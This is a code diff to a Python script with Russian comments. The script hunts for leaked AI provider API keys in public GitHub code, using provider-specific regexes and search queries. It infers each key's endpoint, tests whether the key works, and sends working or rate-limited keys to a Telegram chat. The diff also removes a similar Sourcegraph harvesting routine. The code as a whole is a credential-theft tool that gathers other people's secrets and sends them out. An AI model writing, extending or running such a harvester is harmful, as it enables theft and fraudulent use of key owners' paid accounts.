@@ -7,7 +7,6 @@ import logging
 import asyncio
 import random
 import sqlite3
-import json
 from concurrent.futures import ThreadPoolExecutor
 
 from telegram import Update
@@ -23,6 +22,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 TOTAL_RUN_TIME = 3600
 REPORT_INTERVAL = 900
 
+# Паттерны ключей
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
@@ -101,7 +101,13 @@ def get_urls_from_repo_configs(repo):
 def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
-    queries = ["sk-proj- language:Python", "sk-ant-api03- language:Python", "sk-kimi- language:Python", "sk-cp- language:Python", "sk-sp- language:Python", "hf_ language:Python", "sk- language:JSON", "sk- language:YAML"]
+    
+    queries = [
+        "sk-proj- language:Python", "sk-ant-api03- language:Python", 
+        "sk-kimi- language:Python", "sk-cp- language:Python",
+        "sk-sp- language:Python", "hf_ language:Python", 
+        "sk- language:JSON", "sk- language:YAML", "sk- language:JavaScript"
+    ]
     query = random.choice(queries)
     page = random.randint(1, 10) 
     
@@ -122,36 +128,37 @@ def fetch_github_targets():
                             token = match.group(0)
                             api_urls = []
                             
-                            # 1. URL в строке
+                            # ПРИОРИТЕТ 1: URL в этой же строке
                             for u in URL_REGEX.findall(line):
                                 if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                                 match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                                 if match_url: api_urls.append(match_url.group(1))
                             
-                            # 2. Префикс ключа
+                            # ПРИОРИТЕТ 2: Префикс ключа
                             if not api_urls and p["provider"] != "generic-sk":
                                 api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
                             
-                            # 3. Конфиги репо (Trees API)
+                            # ПРИОРИТЕТ 3: Конфиги репо (Trees API)
                             if not api_urls:
                                 api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                             
-                            # 4. Переменная
+                            # ПРИОРИТЕТ 4: Переменная
                             if not api_urls:
-                                var_name = re.search(r'([A-Za-z0-9_]+)\s*=', line).group(1).lower() if re.search(r'([A-Za-z0-9_]+)\s*=', line) else ""
+                                var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
+                                var_name = var_match.group(1).lower() if var_match else ""
                                 for hint, url in REPO_HINTS.items():
                                     if hint in var_name: api_urls.append(url); break
                                 if not api_urls:
                                     if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                     elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                             
-                            # 5. Имя репо
+                            # ПРИОРИТЕТ 5: Имя репо
                             if not api_urls:
                                 combined = (repo + " " + path).lower()
                                 for hint, url in REPO_HINTS.items():
                                     if hint in combined: api_urls.append(url); break
                                     
-                            # 6. Дефолт
+                            # ПРИОРИТЕТ 6: Дефолт
                             if not api_urls:
                                 api_urls.append(PROVIDER_ENDPOINTS["default"])
                                 
@@ -167,62 +174,6 @@ def fetch_github_targets():
     except Exception as e:
         logger.error(f"❌ Ошибка GitHub: {e}")
         return []
-
-# ─── ПАРСИНГ SOURCEGRAPH ───────────────────────────────────────────────────
-def fetch_sourcegraph_targets():
-    logger.info("🌐 Ищу ключи на Sourcegraph (GitHub, GitLab, Bitbucket)...")
-    query = 'sk-[a-zA-Z0-9_-]{20,} patternType:regexp count:50'
-    url = "https://sourcegraph.com/.api/search/stream"
-    headers = {"Accept": "text/event-stream"}
-    params = {"q": query, "v": "V3"}
-    
-    targets = []
-    try:
-        resp = requests.get(url, headers=headers, params=params, stream=True, timeout=30)
-        if resp.status_code != 200:
-            logger.warning(f"⚠️ Sourcegraph вернул {resp.status_code}")
-            return [], False # Возвращаем False при падении
-            
-        for line in resp.iter_lines(decode_unicode=True):
-            if not line or line.startswith("event:"): continue
-            if line.startswith("data: "):
-                try: data = json.loads(line[6:])
-                except json.JSONDecodeError: continue
-                
-                for match in data:
-                    if match.get("type") != "content" or not match.get("lineMatches"): continue
-                    line_text = match["lineMatches"][0].get("line", "")
-                    if not line_text: continue
-                    
-                    for p in KEY_PATTERNS:
-                        for m in p["regex"].finditer(line_text):
-                            token = m.group(0)
-                            api_urls = []
-                            
-                            for u in URL_REGEX.findall(line_text):
-                                if any(x in u for x in ['github.com', 'gitlab.com', 'telegram', 'w3.org']): continue
-                                match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
-                                if match_url: api_urls.append(match_url.group(1))
-                            
-                            if not api_urls and p["provider"] != "generic-sk":
-                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
-                                
-                            if not api_urls:
-                                api_urls.append(PROVIDER_ENDPOINTS["default"])
-                                
-                            for url_ep in list(set(api_urls))[:1]:
-                                if url_ep: targets.append({"key": token, "endpoint": url_ep.rstrip('/'), "provider": p["provider"]})
-                                
-        unique_targets, seen = [], set()
-        for t in targets:
-            sig = f"{t['key']}_{t['endpoint']}"
-            if sig not in seen: seen.add(sig); unique_targets.append(t)
-            
-        logger.info(f"🌐 Sourcegraph: извлечено пар: {len(unique_targets)}")
-        return unique_targets, True # Возвращаем True при успехе
-    except Exception as e:
-        logger.error(f"❌ Ошибка Sourcegraph: {e}")
-        return [], False
 
 # ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
@@ -265,25 +216,12 @@ async def long_scan_loop():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     start_time = time.time()
     cycle_start_time = time.time()
-    
     total_checked, total_working, cycle_working = 0, 0, 0
-    sg_failures = 0 # Счетчик падений Sourcegraph
     
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        # Если 3 падения подряд - уходим на GitHub
-        if sg_failures >= 3:
-            targets = await asyncio.to_thread(fetch_github_targets)
-        else:
-            targets, sg_ok = await asyncio.to_thread(fetch_sourcegraph_targets)
-            if not sg_ok:
-                sg_failures += 1
-                logger.warning(f"⚠️ Сбой Sourcegraph ({sg_failures}/3). Пока переключаюсь на GitHub.")
-                targets = await asyncio.to_thread(fetch_github_targets)
-            else:
-                sg_failures = 0 # Сбрасываем счетчик при успехе
-                
+        targets = await asyncio.to_thread(fetch_github_targets)
         total_checked += len(targets)
         
         for t in targets:
@@ -297,6 +235,7 @@ async def long_scan_loop():
                 logger.info("   └ ❌ Мертвый")
                 mark_dead(key)
                 continue
+                
             if chk["status"] == "429":
                 logger.info("   └ ⚠️ Rate Limit (ключ живой)")
                 report = f"⚠️ Ключ с лимитом\n🌐 {endpoint}\n🗝 {key}"
